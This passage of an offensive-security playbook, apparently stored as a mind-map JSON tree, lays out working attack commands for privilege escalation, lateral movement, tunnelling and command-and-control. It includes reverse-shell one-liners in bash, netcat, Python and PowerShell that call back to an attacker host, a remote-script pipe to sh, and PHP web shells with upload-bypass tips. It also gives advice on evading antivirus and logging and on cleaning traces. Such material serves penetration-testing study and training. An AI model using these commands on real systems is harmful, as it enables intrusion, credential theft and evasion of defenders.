fingerprint","children":[{"content":"<code>uname -a &amp;&amp; cat /etc/*-release</code>","children":[],"payload":{"tag":"li","lines":"361,362"}},{"content":"Determine kernel version and distribution.","children":[],"payload":{"tag":"li","lines":"362,363"}},{"content":"Output shows kernel string such as 5.4.0&#x2011;42&#x2011;generic and distribution name.","children":[],"payload":{"tag":"li","lines":"363,364"}},{"content":"Match the kernel to public exploits with searchsploit. Download and compile a suitable PoC if the version is vulnerable.","children":[],"payload":{"tag":"li","lines":"364,366"}}],"payload":{"tag":"h3","lines":"360,361"}},{"content":"4 &#x2014; Locate SUID binaries","children":[{"content":"<code>find / -perm -4000 -type f 2&gt;/dev/null</code>","children":[],"payload":{"tag":"li","lines":"367,368"}},{"content":"Discover binaries that run with root privileges.","children":[],"payload":{"tag":"li","lines":"368,369"}},{"content":"Expect a list of paths like /usr/bin/nmap or /usr/bin/find.","children":[],"payload":{"tag":"li","lines":"369,370"}},{"content":"Check each binary on GTFOBins; if an escape exists, use it to obtain a root shell.","children":[],"payload":{"tag":"li","lines":"370,372"}}],"payload":{"tag":"h3","lines":"366,367"}},{"content":"5 &#x2014; Examine scheduled tasks","children":[{"content":"<code>cat /etc/crontab /etc/cron.d/* 2&gt;/dev/null</code>","children":[],"payload":{"tag":"li","lines":"373,374"}},{"content":"Look for scripts executed by root on a schedule.","children":[],"payload":{"tag":"li","lines":"374,375"}},{"content":"Lines will show script paths and run intervals.","children":[],"payload":{"tag":"li","lines":"375,376"}},{"content":"If any script path is writable, insert a reverse&#x2011;shell payload to gain privilege on the next execution.","children":[],"payload":{"tag":"li","lines":"376,378"}}],"payload":{"tag":"h3","lines":"372,373"}},{"content":"6 &#x2014; Automated enumeration","children":[{"content":"<code>curl -sS http://&lt;attacker&gt;/linpeas.sh | sh</code>","children":[],"payload":{"tag":"li","lines":"379,380"}},{"content":"Run LinPEAS for a full misconfiguration scan.","children":[],"payload":{"tag":"li","lines":"380,381"}},{"content":"LinPEAS prints colour coded findings; red and yellow items indicate privilege&#x2011;escalation leads.","children":[],"payload":{"tag":"li","lines":"381,382"}},{"content":"Investigate highlighted items and chain multiple moderate issues if necessary.","children":[],"payload":{"tag":"li","lines":"382,384"}}],"payload":{"tag":"h3","lines":"378,379"}},{"content":"7 &#x2014; Common exploitation paths","children":[{"content":"NOPASSWD sudo allows <code>sudo -s</code> for instant root.","children":[],"payload":{"tag":"li","lines":"385,386"}},{"content":"Writable cron scripts let you append a bash reverse shell and wait for it to fire.","children":[],"payload":{"tag":"li","lines":"386,387"}},{"content":"SUID binaries such as nmap support interactive mode: run <code>nmap --interactive</code>, then <code>!sh</code>.","children":[],"payload":{"tag":"li","lines":"387,388"}},{"content":"If the kernel is vulnerable to DirtyPipe (5.8+), compile the exploit and execute to gain root.","children":[],"payload":{"tag":"li","lines":"388,390"}}],"payload":{"tag":"h3","lines":"384,385"}}],"payload":{"tag":"h2","lines":"346,347"}},{"content":"Windows","children":[{"content":"1 &#x2014; Privilege and OS information","children":[{"content":"<code>whoami /priv</code>","children":[],"payload":{"tag":"li","lines":"393,394"}},{"content":"<code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code>","children":[],"payload":{"tag":"li","lines":"394,395"}},{"content":"Collect enabled privileges and build number.","children":[],"payload":{"tag":"li","lines":"395,396"}},{"content":"Output shows tokens like SeImpersonatePrivilege and the OS build.","children":[],"payload":{"tag":"li","lines":"396,397"}},{"content":"If SeImpersonatePrivilege is enabled, plan a Potato style token exploit targeting that build.","children":[],"payload":{"tag":"li","lines":"397,399"}}],"payload":{"tag":"h3","lines":"392,393"}},{"content":"2 &#x2014; Local administrator membership","children":[{"content":"<code>net localgroup administrators</code>","children":[],"payload":{"tag":"li","lines":"400,401"}},{"content":"Display users and groups with admin rights.","children":[],"payload":{"tag":"li","lines":"401,402"}},{"content":"Expect a list of accounts such as Administrator or svc&#x2011;admin.","children":[],"payload":{"tag":"li","lines":"402,403"}},{"content":"If current user appears, open an elevated command prompt with runas or PsExec.","children":[],"payload":{"tag":"li","lines":"403,405"}}],"payload":{"tag":"h3","lines":"399,400"}},{"content":"3 &#x2014; Automated enumeration","children":[{"content":"<code>winPEASany.exe quiet</code>","children":[],"payload":{"tag":"li","lines":"406,407"}},{"content":"Scan registry, services and file permissions for escalation vectors.","children":[],"payload":{"tag":"li","lines":"407,408"}},{"content":"The tool highlights unquoted service paths, weak ACLs and AlwaysInstallElevated settings.","children":[],"payload":{"tag":"li","lines":"408,409"}},{"content":"Note any red findings and apply the appropriate exploit technique.","children":[],"payload":{"tag":"li","lines":"409,411"}}],"payload":{"tag":"h3","lines":"405,406"}},{"content":"4 &#x2014; AlwaysInstallElevated technique","children":[{"content":"<code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated</code>","children":[],"payload":{"tag":"li","lines":"412,413"}},{"content":"Check if MSI files install with SYSTEM privileges.","children":[],"payload":{"tag":"li","lines":"413,414"}},{"content":"Value 0x1 means the policy is enabled.","children":[],"payload":{"tag":"li","lines":"414,415"}},{"content":"Craft a malicious MSI with msfvenom and install it using msiexec to obtain a SYSTEM shell.","children":[],"payload":{"tag":"li","lines":"415,417"}}],"payload":{"tag":"h3","lines":"411,412"}},{"content":"5 &#x2014; Unquoted service path exploit","children":[{"content":"<code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /v &quot;C:\\\\Windows&quot; | findstr /v &apos;&quot;&apos;</code>","children":[],"payload":{"tag":"li","lines":"418,419"}},{"content":"Identify services whose paths contain spaces but lack quotes.","children":[],"payload":{"tag":"li","lines":"419,420"}},{"content":"Output lists vulnerable services and their paths.","children":[],"payload":{"tag":"li","lines":"420,421"}},{"content":"Place a payload executable at the first space break, restart the service or reboot to run as SYSTEM.","children":[],"payload":{"tag":"li","lines":"421,423"}}],"payload":{"tag":"h3","lines":"417,418"}},{"content":"6 &#x2014; Token impersonation","children":[{"content":"<code>PrintSpoofer64.exe -i -c cmd</code>","children":[],"payload":{"tag":"li","lines":"424,425"}},{"content":"Use SeImpersonatePrivilege to impersonate SYSTEM via named pipe trick.","children":[],"payload":{"tag":"li","lines":"425,426"}},{"content":"Successful execution opens a SYSTEM command shell.","children":[],"payload":{"tag":"li","lines":"426,427"}},{"content":"Dump SAM and SYSTEM hives, then move laterally with psexec or smbexec.<br>\npersonation (PrintSpoofer, JuicyPotato, RoguePotato)","children":[],"payload":{"tag":"li","lines":"427,430"}}],"payload":{"tag":"h3","lines":"423,424"}}],"payload":{"tag":"h2","lines":"390,391"}}],"payload":{"tag":"h1","lines":"344,345"}},{"content":"Lateral Movement Playbook","children":[{"content":"Windows","children":[{"content":"WinRM","children":[{"content":"<code>evil-winrm -i &lt;target&gt; -u &lt;user&gt; -p &lt;pass&gt;</code>","children":[],"payload":{"tag":"li","lines":"437,438"}},{"content":"Open an interactive PowerShell session over WinRM for remote command execution.","children":[],"payload":{"tag":"li","lines":"438,439"}},{"content":"A successful connection shows the Evil&#x2011;WinRM banner and a <code>PS&gt;</code> prompt; failures display authentication or transport errors.","children":[],"payload":{"tag":"li","lines":"439,440"}},{"content":"Use the session to run enumeration scripts, upload post&#x2011;exploitation tools, and launch privilege&#x2011;escalation exploits.","children":[],"payload":{"tag":"li","lines":"440,442"}}],"payload":{"tag":"h3","lines":"436,437"}},{"content":"PSExec","children":[{"content":"<code>psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"443,444"}},{"content":"Leverage SMB service creation to spawn a SYSTEM&#x2011;level shell on the remote host.","children":[],"payload":{"tag":"li","lines":"444,445"}},{"content":"On success you receive an interactive cmd.exe prompt; access denied or service&#x2011;start failures indicate incorrect credentials or disabled ADMIN&#x24; share.","children":[],"payload":{"tag":"li","lines":"445,446"}},{"content":"Dump SAM and SYSTEM hives, create new local admins, or pivot to additional machines.","children":[],"payload":{"tag":"li","lines":"446,448"}}],"payload":{"tag":"h3","lines":"442,443"}},{"content":"RDP","children":[{"content":"<code>xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"449,450"}},{"content":"Gain full graphical desktop access to the target computer.","children":[],"payload":{"tag":"li","lines":"450,451"}},{"content":"A remote desktop window opens if NLA credentials are valid; otherwise CredSSP errors appear.","children":[],"payload":{"tag":"li","lines":"451,452"}},{"content":"Transfer files via shared clipboard or mapped drives, disable defensive tools, and launch GUI&#x2011;only escalation utilities.","children":[],"payload":{"tag":"li","lines":"452,454"}}],"payload":{"tag":"h3","lines":"448,449"}}],"payload":{"tag":"h2","lines":"434,435"}},{"content":"Linux","children":[{"content":"SSH Pivot Tunnel","children":[{"content":"<code>ssh -L 1080:&lt;target&gt;:22 user@jumpbox</code>","children":[],"payload":{"tag":"li","lines":"459,460"}},{"content":"Forward local port&#x202f;1080 through a jump host to reach an internal SSH service.","children":[],"payload":{"tag":"li","lines":"460,461"}},{"content":"Terminal remains connected and a local listener appears; connecting to localhost:1080 should relay traffic to <code>&lt;target&gt;:22</code>.","children":[],"payload":{"tag":"li","lines":"461,462"}},{"content":"Chain proxychains through the tunnel or open a secondary SSH session to the internal host.","children":[],"payload":{"tag":"li","lines":"462,464"}}],"payload":{"tag":"h3","lines":"458,459"}},{"content":"ProxyChains Internal Scan","children":[{"content":"<code>proxychains nmap -sT -Pn -p- &lt;internal-ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"465,466"}},{"content":"Route Nmap traffic through a SOCKS or local port tunnel for stealthy internal enumeration.","children":[],"payload":{"tag":"li","lines":"466,467"}},{"content":"Open ports on the internal host are returned; timeouts suggest the proxy route is blocked.","children":[],"payload":{"tag":"li","lines":"467,468"}},{"content":"Adjust <code>/etc/proxychains.conf</code> or switch to chisel/socat if scans fail.","children":[],"payload":{"tag":"li","lines":"468,470"}}],"payload":{"tag":"h3","lines":"464,465"}}],"payload":{"tag":"h2","lines":"456,457"}},{"content":"Tunnelling &amp; Tools","children":[{"content":"Chisel Reverse SOCKS","children":[{"content":"<code>chisel server -p 8000 --reverse</code>&#x2003;and on the compromised host<br>\n<code>chisel client &lt;attacker&gt;:8000 R:1080:10.0.0.5:22</code>","children":[],"payload":{"tag":"li","lines":"475,477"}},{"content":"Create a reverse tunnel that exposes 10.0.0.5:22 to a local SOCKS&#x202f;proxy on the attacker.","children":[],"payload":{"tag":"li","lines":"477,478"}},{"content":"The server console logs &#x201c;session established&#x201d; and local port&#x202f;1080 now forwards to the internal SSH service.","children":[],"payload":{"tag":"li","lines":"478,479"}},{"content":"Configure proxychains or your SSH client to use <code>socks5://127.0.0.1:1080</code> and continue post&#x2011;exploitation.","children":[],"payload":{"tag":"li","lines":"479,481"}}],"payload":{"tag":"h3","lines":"474,475"}},{"content":"Socat Port Forward","children":[{"content":"<code>socat TCP-LISTEN:9001,reuseaddr,fork TCP:10.0.0.5:445</code>","children":[],"payload":{"tag":"li","lines":"482,483"}},{"content":"Forward local port&#x202f;9001 to an internal SMB share over an existing channel (VPN, SSH, etc.).","children":[],"payload":{"tag":"li","lines":"483,484"}},{"content":"Socat prints &#x201c;forking&#x201d; on each new connection; accessing <code>\\\\127.0.0.1\\share</code> should hit the remote host.","children":[],"payload":{"tag":"li","lines":"484,485"}},{"content":"Combine with smbclient or EternalBlue exploits against the forwarded service.","children":[],"payload":{"tag":"li","lines":"485,487"}}],"payload":{"tag":"h3","lines":"481,482"}},{"content":"SSH Dynamic SOCKS","children":[{"content":"<code>ssh -D 9050 user@pivot</code>","children":[],"payload":{"tag":"li","lines":"488,489"}},{"content":"Establish a dynamic SOCKS&#x202f;proxy through a pivot host for flexible TCP routing.","children":[],"payload":{"tag":"li","lines":"489,490"}},{"content":"The SSH session stays idle while local port&#x202f;9050 listens; test with <code>curl --socks5 127.0.0.1:9050 http://internal</code>.","children":[],"payload":{"tag":"li","lines":"490,491"}},{"content":"Use proxychains or browser proxy settings to explore internal web apps and services.","children":[],"payload":{"tag":"li","lines":"491,493"}}],"payload":{"tag":"h3","lines":"487,488"}}],"payload":{"tag":"h2","lines":"472,473"}},{"content":"Reverse Shell Cheatsheets","children":[{"content":"Linux Reverse Shells","children":[{"content":"Bash Reverse Shell","children":[{"content":"<code>bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1</code>","children":[],"payload":{"tag":"li","lines":"500,501"}},{"content":"Spawn an interactive bash shell back to the listener on port&#x202f;4444.","children":[],"payload":{"tag":"li","lines":"501,502"}},{"content":"No output if successful; the attacker&#x2019;s Netcat session receives a shell prompt.","children":[],"payload":{"tag":"li","lines":"502,503"}},{"content":"Upgrade to a full TTY with <code>python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code>.","children":[],"payload":{"tag":"li","lines":"503,505"}}],"payload":{"tag":"h4","lines":"499,500"}},{"content":"Netcat (Traditional)","children":[{"content":"<code>nc -e /bin/bash &lt;attacker_ip&gt; 4444</code>","children":[],"payload":{"tag":"li","lines":"506,507"}},{"content":"Use Netcat&#x2019;s <code>-e</code> option to pipe <code>/bin/bash</code> to the TCP connection.","children":[],"payload":{"tag":"li","lines":"507,508"}},{"content":"Modern systems often disable <code>-e</code>; if blocked, fall back to the mkfifo method.","children":[],"payload":{"tag":"li","lines":"508,509"}},{"content":"Catch the shell with <code>nc -lvnp 4444</code> on the attacker machine.","children":[],"payload":{"tag":"li","lines":"509,511"}}],"payload":{"tag":"h4","lines":"505,506"}},{"content":"Netcat (mkfifo Variant)","children":[{"content":"<code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &lt;attacker_ip&gt; 4444 &gt; /tmp/f</code>","children":[],"payload":{"tag":"li","lines":"512,513"}},{"content":"Achieve a reverse shell on systems where Netcat lacks <code>-e</code>.","children":[],"payload":{"tag":"li","lines":"513,514"}},{"content":"The command returns immediately; watch the listener for an incoming shell.","children":[],"payload":{"tag":"li","lines":"514,515"}},{"content":"Remove <code>/tmp/f</code> afterwards to clean traces.","children":[],"payload":{"tag":"li","lines":"515,517"}}],"payload":{"tag":"h4","lines":"511,512"}},{"content":"Python Reverse Shell","children":[{"content":"<code>python3 -c &apos;import socket,subprocess,os;s=socket.socket();s.connect((&quot;&lt;ip&gt;&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;])&apos;</code>","children":[],"payload":{"tag":"li","lines":"518,519"}},{"content":"Use Python&#x2019;s socket library to connect back and spawn <code>/bin/sh</code>.","children":[],"payload":{"tag":"li","lines":"519,520"}},{"content":"Silent on the victim; the listener gains a shell prompt.","children":[],"payload":{"tag":"li","lines":"520,521"}},{"content":"Works on hosts with Python&#x202f;3 installed; adapt to Python&#x202f;2 if necessary.","children":[],"payload":{"tag":"li","lines":"521,523"}}],"payload":{"tag":"h4","lines":"517,518"}}],"payload":{"tag":"h3","lines":"497,498"}},{"content":"Windows Reverse Shells","children":[{"content":"PowerShell Reverse Shell","children":[{"content":"<code>powershell -nop -c &quot;&#x24;client = New-Object System.Net.Sockets.TCPClient(&apos;&lt;ip&gt;&apos;,4444);&#x24;stream = &#x24;client.GetStream();[byte[]]&#x24;bytes = 0..65535|%{0};while((&#x24;i = &#x24;stream.Read(&#x24;bytes,0,&#x24;bytes.Length)) -ne 0){;&#x24;data=(New-Object System.Text.ASCIIEncoding).GetString(&#x24;bytes,0,&#x24;i);&#x24;sendback=(iex &#x24;data 2&gt;&amp;1 | Out-String);&#x24;sendback2=&#x24;sendback+&apos;PS &apos;+(pwd).Path+&apos;&gt; &apos;;&#x24;stream.Write(([text.encoding]::ASCII).GetBytes(&#x24;sendback2),0,&#x24;sendback2.Length);&#x24;stream.Flush()}&quot;</code>","children":[],"payload":{"tag":"li","lines":"526,527"}},{"content":"Execute a one&#x2011;liner PowerShell payload that connects to the attacker and loops commands.","children":[],"payload":{"tag":"li","lines":"527,528"}},{"content":"A shell appears on the listener; AV may flag the long string, so obfuscate if required.","children":[],"payload":{"tag":"li","lines":"528,529"}},{"content":"Use <code>powershell -enc &lt;Base64&gt;</code> to shorten and bypass transcription logs.","children":[],"payload":{"tag":"li","lines":"529,531"}}],"payload":{"tag":"h4","lines":"525,526"}},{"content":"Netcat (nc.exe)","children":[{"content":"<code>nc.exe &lt;attacker_ip&gt; 4444 -e cmd.exe</code>","children":[],"payload":{"tag":"li","lines":"532,533"}},{"content":"Windows version of Netcat spawns <code>cmd.exe</code> to the attacker.","children":[],"payload":{"tag":"li","lines":"533,534"}},{"content":"Requires <code>nc.exe</code> on the victim; firewalls may block unknown binaries.","children":[],"payload":{"tag":"li","lines":"534,535"}},{"content":"Rename nc.exe and place it in a writable directory, then trigger the command.","children":[],"payload":{"tag":"li","lines":"535,537"}}],"payload":{"tag":"h4","lines":"531,532"}}],"payload":{"tag":"h3","lines":"523,524"}}],"payload":{"tag":"h2","lines":"495,496"}},{"content":"Web Shells","children":[{"content":"Simple PHP Shell","children":[{"content":"\n<pre data-lines=\"542,545\"><code class=\"language-php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-title function_ invoke__\">system</span>(<span class=\"hljs-variable\">&#x24;_GET</span>[<span class=\"hljs-string\">&apos;cmd&apos;</span>]); <span class=\"hljs-meta\">?&gt;</span>\n</code></pre>","children":[],"payload":{"tag":"li","lines":"542,545"}},{"content":"A minimal PHP web shell that executes commands passed via the <code>cmd</code> parameter.","children":[],"payload":{"tag":"li","lines":"545,546"}},{"content":"Browsing to <code>http://target/shell.php?cmd=whoami</code> returns the command output.","children":[],"payload":{"tag":"li","lines":"546,547"}},{"content":"Use <code>curl</code> or Burp repeater to run additional commands and establish a reverse shell.","children":[],"payload":{"tag":"li","lines":"547,549"}}],"payload":{"tag":"h3","lines":"541,542"}},{"content":"Upload Bypass Tips","children":[{"content":"Try extensions like <code>.phtml</code>, <code>.php5</code>, or double extensions <code>shell.jpg.php</code>.","children":[],"payload":{"tag":"li","lines":"550,551"}},{"content":"If the uploader filters by content&#x2011;type, change <code>Content&#x2011;Type: image/jpeg</code> while keeping PHP code.","children":[],"payload":{"tag":"li","lines":"551,552"}},{"content":"Use <code>&lt;?php echo shell_exec(&#x24;_POST[&quot;c&quot;]); ?&gt;</code> plus a POST request to bypass GET filters.","children":[],"payload":{"tag":"li","lines":"552,554"}}],"payload":{"tag":"h3","lines":"549,550"}},{"content":"Access Example","children":[{"content":"<code>curl http://target/shell.php?cmd=id</code>","children":[],"payload":{"tag":"li","lines":"555,556"}},{"content":"Sends the <code>id</code> command to the uploaded shell.","children":[],"payload":{"tag":"li","lines":"556,557"}},{"content":"The HTTP response shows UID/GID information.","children":[],"payload":{"tag":"li","lines":"557,558"}},{"content":"Pipe further commands or upgrade to a reverse shell.","children":[],"payload":{"tag":"li","lines":"558,560"}}],"payload":{"tag":"h3","lines":"554,555"}}],"payload":{"tag":"h2","lines":"539,540"}}],"payload":{"tag":"h1","lines":"432,433"}},{"content":"Command and Control (C2) Frameworks","children":[{"content":"Sliver","children":[{"content":"\n<p data-lines=\"564,565\"><code>sliver-server</code></p>","children":[],"payload":{"tag":"li","lines":"564,565"}},{"content":"\n<p data-lines=\"565,566\">Start the Sliver C2 server and display the interactive console.</p>","children":[],"payload":{"tag":"li","lines":"565,566"}},{"content":"\n<p data-lines=\"566,567\">Console shows <code>[*] server started</code> and awaits operator commands.</p>","children":[],"payload":{"tag":"li","lines":"566,567"}},{"content":"\n<p data-lines=\"567,568\">Generate implants, stage listeners, or connect existing callbacks.</p>","children":[],"payload":{"tag":"li","lines":"567,569"}},{"content":"\n<p data-lines=\"569,570\"><code>generate --mtls &lt;ip&gt;:443 --name stealth --os windows</code></p>","children":[],"payload":{"tag":"li","lines":"569,570"}},{"content":"\n<p data-lines=\"570,571\">Create a Windows MTLS implant named &quot;stealth&quot; beaconing to the server.</p>","children":[],"payload":{"tag":"li","lines":"570,571"}},{"content":"\n<p data-lines=\"571,572\">Command outputs the implant file path and configuration details.</p>","children":[],"payload":{"tag":"li","lines":"571,572"}},{"content":"\n<p data-lines=\"572,573\">Transfer the executable to the target and execute; a new session appears in the Sliver console.</p>","children":[],"payload":{"tag":"li","lines":"572,574"}}],"payload":{"tag":"h2","lines":"563,564"}},{"content":"Cobalt Strike","children":[{"content":"<code>./teamserver &lt;ip&gt; &lt;password&gt;</code>","children":[],"payload":{"tag":"li","lines":"575,576"}},{"content":"Launch a Cobalt&#xa0;Strike team server for Beacon callbacks.","children":[],"payload":{"tag":"li","lines":"576,577"}},{"content":"Terminal prints <code>Beacon listener started</code>; the GUI connects with the supplied password.","children":[],"payload":{"tag":"li","lines":"577,578"}},{"content":"Create HTTP/HTTPS listeners, craft beacon payloads, and distribute to compromised hosts.","children":[],"payload":{"tag":"li","lines":"578,580"}}],"payload":{"tag":"h2","lines":"574,575"}},{"content":"Metasploit Multi/Handler","children":[{"content":"<code>msfconsole</code>","children":[],"payload":{"tag":"li","lines":"581,582"}},{"content":"<code>use exploit/multi/handler</code>","children":[],"payload":{"tag":"li","lines":"582,583"}},{"content":"<code>set payload windows/x64/meterpreter/reverse_https</code>","children":[],"payload":{"tag":"li","lines":"583,584"}},{"content":"<code>set LHOST &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"584,585"}},{"content":"<code>set LPORT 443</code>","children":[],"payload":{"tag":"li","lines":"585,586"}},{"content":"<code>run</code>","children":[],"payload":{"tag":"li","lines":"586,587"}},{"content":"Start a Meterpreter listener waiting for reverse HTTPS connections.","children":[],"payload":{"tag":"li","lines":"587,588"}},{"content":"The handler prints <code>[*] Started reverse HTTPS handler on 0.0.0.0:443</code>.","children":[],"payload":{"tag":"li","lines":"588,589"}},{"content":"Generate a matching payload with <code>msfvenom</code>, execute on the target, then interact with the session for post&#x2011;exploitation.","children":[],"payload":{"tag":"li","lines":"589,591"}}],"payload":{"tag":"h2","lines":"580,581"}}],"payload":{"tag":"h1","lines":"561,562"}},{"content":"Example Chains (Enumeration &#x2192; Exploitation &#x2192; Shell &#x2192; Escalation)","children":[{"content":"Linux Example","children":[{"content":"\n<p data-lines=\"596,597\"><code>nmap -p 80 &lt;target&gt;</code></p>","children":[],"payload":{"tag":"li","lines":"596,597"}},{"content":"\n<p data-lines=\"597,598\">Discover an open HTTP service on port&#xa0;80.</p>","children":[],"payload":{"tag":"li","lines":"597,598"}},{"content":"\n<p data-lines=\"598,599\">Output lists port&#xa0;80/tcp open with Apache 2.4.29.</p>","children":[],"payload":{"tag":"li","lines":"598,599"}},{"content":"\n<p data-lines=\"599,600\">Next: perform directory brute&#x2011;force.</p>","children":[],"payload":{"tag":"li","lines":"599,601"}},{"content":"\n<p data-lines=\"601,602\"><code>gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code></p>","children":[],"payload":{"tag":"li","lines":"601,602"}},{"content":"\n<p data-lines=\"602,603\">Identify hidden upload directory <code>/upload</code>.</p>","children":[],"payload":{"tag":"li","lines":"602,603"}},{"content":"\n<p data-lines=\"603,604\">Gobuster returns <code>/upload (Status: 301)</code>.</p>","children":[],"payload":{"tag":"li","lines":"603,604"}},{"content":"\n<p data-lines=\"604,605\">Prepare to upload a PHP web&#xa0;shell.</p>","children":[],"payload":{"tag":"li","lines":"604,606"}},{"content":"\n<p data-lines=\"606,607\"><code>curl -F &quot;file=@shell.php&quot; http://&lt;target&gt;/upload/</code></p>","children":[],"payload":{"tag":"li","lines":"606,607"}},{"content":"\n<p data-lines=\"607,608\">Upload a PHP reverse shell.</p>","children":[],"payload":{"tag":"li","lines":"607,608"}},{"content":"\n<p data-lines=\"608,609\">Server responds with 200&#xa0;OK and file path <code>/upload/shell.php</code>.</p>","children":[],"payload":{"tag":"li","lines":"608,609"}},{"content":"\n<p data-lines=\"609,610\">Trigger the shell to gain command execution.</p>","children":[],"payload":{"tag":"li","lines":"609,611"}},{"content":"\n<p data-lines=\"611,612\"><code>curl http://&lt;target&gt;/upload/shell.php?cmd=whoami</code></p>","children":[],"payload":{"tag":"li","lines":"611,612"}},{"content":"\n<p data-lines=\"612,613\">Execute the web shell and confirm code execution.</p>","children":[],"payload":{"tag":"li","lines":"612,613"}},{"content":"\n<p data-lines=\"613,614\">Response shows <code>www-data</code>.</p>","children":[],"payload":{"tag":"li","lines":"613,614"}},{"content":"\n<p data-lines=\"614,615\">Set up a Netcat listener and trigger a reverse shell for interactive access.</p>","children":[],"payload":{"tag":"li","lines":"614,616"}},{"content":"\n<p data-lines=\"616,617\"><code>python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code></p>","children":[],"payload":{"tag":"li","lines":"616,617"}},{"content":"\n<p data-lines=\"617,618\">Upgrade to a fully interactive TTY.</p>","children":[],"payload":{"tag":"li","lines":"617,618"}},{"content":"\n<p data-lines=\"618,619\">Bash prompt behaves normally.</p>","children":[],"payload":{"tag":"li","lines":"618,619"}},{"content":"\n<p data-lines=\"619,620\">Run LinPEAS or manual checks for privilege escalation paths.</p>","children":[],"payload":{"tag":"li","lines":"619,621"}}],"payload":{"tag":"h2","lines":"595,596"}},{"content":"Windows Example","children":[{"content":"\n<p data-lines=\"622,623\"><code>nmap -p 445 --script smb-enum-shares &lt;target&gt;</code></p>","children":[],"payload":{"tag":"li","lines":"622,623"}},{"content":"\n<p data-lines=\"623,624\">Enumerate SMB shares and identify writable share <code>\\shared</code>.</p>","children":[],"payload":{"tag":"li","lines":"623,624"}},{"content":"\n<p data-lines=\"624,625\">Script output lists SHARE&#xa0;&#x2014;&#xa0;READ/WRITE.</p>","children":[],"payload":{"tag":"li","lines":"624,625"}},{"content":"\n<p data-lines=\"625,626\">Mount the share to stage payloads.</p>","children":[],"payload":{"tag":"li","lines":"625,627"}},{"content":"\n<p data-lines=\"627,628\"><code>copy nc.exe \\\\&lt;target&gt;\\shared\\</code></p>","children":[],"payload":{"tag":"li","lines":"627,628"}},{"content":"\n<p data-lines=\"628,629\">Upload Netcat to the writable share.</p>","children":[],"payload":{"tag":"li","lines":"628,629"}},{"content":"\n<p data-lines=\"629,630\">Command completes with <code>1 file(s) copied</code>.</p>","children":[],"payload":{"tag":"li","lines":"629,630"}},{"content":"\n<p data-lines=\"630,631\">Execute via SMB service creation.</p>","children":[],"payload":{"tag":"li","lines":"630,632"}},{"content":"\n<p data-lines=\"632,633\"><code>psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;target&gt; -s cmd.exe /c \\\\shared\\nc.exe &lt;ip&gt; 4444 -e cmd.exe</code></p>","children":[],"payload":{"tag":"li","lines":"632,633"}},{"content":"\n<p data-lines=\"633,634\">Launch a reverse shell as SYSTEM.</p>","children":[],"payload":{"tag":"li","lines":"633,634"}},{"content":"\n<p data-lines=\"634,635\">Meterpreter/Netcat listener on port&#xa0;4444 receives a SYSTEM shell.</p>","children":[],"payload":{"tag":"li","lines":"634,635"}},{"content":"\n<p data-lines=\"635,636\">Dump hashes with <code>reg save</code> and move laterally using the obtained credentials.</p>","children":[],"payload":{"tag":"li","lines":"635,637"}}],"payload":{"tag":"h2","lines":"621,622"}}],"payload":{"tag":"h1","lines":"593,594"}},{"content":"Tool Integrations &amp; Expanded Workflow","children":[{"content":"Enumeration Phase","children":[{"content":"Nmap","children":[{"content":"<pre data-lines=\"645,648\"><code class=\"language-bash\">nmap -sC -sV -T4 -oA scan &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"645,648"}},{"content":"<pre data-lines=\"654,657\"><code class=\"language-bash\">nmap --script vuln -p &lt;ports&gt; &lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"654,657"}}],"payload":{"tag":"h3","lines":"644,645"}},{"content":"Wireshark","children":[{"content":"Use to analyze live traffic (e.g., FTP creds, SMB shares, cookies)","children":[],"payload":{"tag":"li","lines":"663,664"}},{"content":"Filter examples:","children":[{"content":"<code>http.request</code>","children":[],"payload":{"tag":"li","lines":"665,666"}},{"content":"<code>ftp</code>","children":[],"payload":{"tag":"li","lines":"666,667"}},{"content":"<code>ip.addr == &lt;target&gt;</code>","children":[],"payload":{"tag":"li","lines":"667,669"}}],"payload":{"tag":"li","lines":"664,669"}}],"payload":{"tag":"h3","lines":"662,663"}},{"content":"Maltego","children":[{"content":"Visual recon on relationships, domains, email addresses","children":[],"payload":{"tag":"li","lines":"670,672"}}],"payload":{"tag":"h3","lines":"669,670"}}],"payload":{"tag":"h2","lines":"642,643"}},{"content":"Web Enumeration","children":[{"content":"Gobuster / ffuf","children":[{"content":"<pre data-lines=\"677,681\"><code class=\"language-bash\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt\nffuf -u http://&lt;target&gt;/FUZZ -w /usr/share/wordlists/...\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"677,681"}}],"payload":{"tag":"h3","lines":"676,677"}},{"content":"Nikto","children":[{"content":"<pre data-lines=\"687,690\"><code class=\"language-bash\">nikto -h http://&lt;target&gt;\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"687,690"}}],"payload":{"tag":"h3","lines":"686,687"}},{"content":"OWASP ZAP / Burp Suite","children":[{"content":"Intercept login forms, test auth bypass, fuzz params","children":[],"payload":{"tag":"li","lines":"696,697"}},{"content":"Export requests for reuse with other tools (e.g., Hydra, SQLmap)","children":[],"payload":{"tag":"li","lines":"697,699"}}],"payload":{"tag":"h3","lines":"695,696"}}],"payload":{"tag":"h2","lines":"674,675"}},{"content":"Exploitation 